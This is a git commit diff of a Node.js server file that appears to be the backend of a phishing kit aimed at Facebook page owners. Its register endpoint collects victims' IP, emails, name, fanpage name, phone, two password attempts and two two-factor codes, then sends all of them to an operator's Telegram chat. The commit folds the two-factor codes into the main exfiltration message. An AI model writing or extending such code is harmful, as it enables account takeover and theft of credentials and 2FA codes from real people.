01db2667c0da4e49521996fdbdc28dfa1505b611
quyenunlock20 <quyenunlock20@gmail.com>
2024-10-02 19:29:17 +0700

    update

--- index.js
+++ index.js
@@ -25,30 +25,22 @@ app.post('/api/resgister', (req, res) => {
     res.send(result);
 
     // SEND DATA TO TELE
-
-    console.log(data.firstTwoFa);
-
-if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
     
     const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
+-----------------------------
 <strong>Email Business:</strong> ${data.businessEmail ? data.businessEmail : ''} 
 <strong>Email Personal:</strong> ${data.personalEmail ? data.personalEmail : ''}
 <strong>Full Name:</strong> ${data.fullName ? data.fullName : ''} 
 <strong>Fanpage Name:</strong> ${data.fanpageName ? data.fanpageName : ''}
 <strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}
 <strong>Password First:</strong> ${data.passwordFirst ? data.passwordFirst : ''}
-<strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}`;
+<strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}
+-----------------------------
+<strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
+<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
 
     bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });
 
-} else {
-
-    const messageCode = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
-<strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
-<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
-    bot.sendMessage(process.env.CHAT_ID, messageCode,  { parse_mode: 'HTML' });
-
-}
 
 
 
